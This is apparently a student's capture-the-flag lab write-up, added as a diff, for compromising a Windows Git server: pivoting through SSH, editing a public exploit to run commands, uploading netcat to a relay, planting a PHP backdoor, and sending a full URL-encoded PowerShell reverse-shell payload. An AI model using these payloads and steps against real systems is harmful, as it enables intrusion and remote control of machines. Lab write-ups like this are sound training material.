@@ -1,0 +1,67 @@
+
+									Git Server Exploitation
+								--------------------------------------
+
+1. Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment
+ans: auto-complete
+command: sshuttle -r root@10.200.109.200 --ssh-cmd "ssh -i id_rsa" 10.200.109.0/24 -x 10.200.109.200 (attack machine)
+	 ssh -i id_rsa root@10.200.109.200
+command: cp ../task_19/43777.py . (we got this in task_19 so i copy it here)
+command: nano 43777.py
+	 (change the ip address to 10.200.109.250)
+
+2. First up, let's use some basic enumeration to get to grips with the webshell:
+   What is the hostname for this target?
+ans: git-serv
+command: nano 43777.py
+	 (change command = "whoami" to "hostname")
+command: ./43777.py
+
+3. What operating system is this target? 
+ans: windows
+command: nano 43777.py
+	 (change command = "hostname" to "systeminfo")
+command: ./43777.py
+
+4. What user is the server running as? 
+ans: nt authority\system
+command: nano 43777.py
+	 (change command = "systeminfo" to "whoami")
+command: ./43777.py
+
+5. "ping -n 3 ATTACKING_IP" ,This will send three ICMP ping packets back to you.
+    How many make it to the waiting listener? 
+ans: 0
+command: nano 43777.py 
+	 (change command: "whoami" to "ping -n 3 10.50.110.11")
+command: tcpdump -i tun0 icmp
+command: ./43777.py
+	 (command executed but not receive any icmp packets on tcpdump)
+
+6. With that done, set up either a listener or a relay on .200.
+ans: auto-complete
+command: nano 43777.py
+	 (search for backdoor in php and change the name here my is exploit-sujal)
+command: cp /usr/bin/nc .
+command: python3 -m http.server 80 (attack machine)
+command: curl 10.50.110.11/nc -o ./nc-sujal
+command: firewall-cmd --zone=public --add-port 16000/tcp (ssh) (i opened 16000 num port for netcat connection)
+command: ./nc-sujal -nvlp 16000 (ssh)
+ 	
+6. Pick a method (cURL, BurpSuite, or any others) and get a shell!
+ans: auto-complete
+     (set burp proxy and open browser and go-to 10.200.109.150/web/exploit-sujal)
+     (send request to the repeter and change the method of get to post)
+     (then set Content-Type: application/x-www-form-urlencoded)
+     (then a=powershell.exe+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.200.109.200',16000)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
+     
+
+
+
+
+
+
+
+
+
+
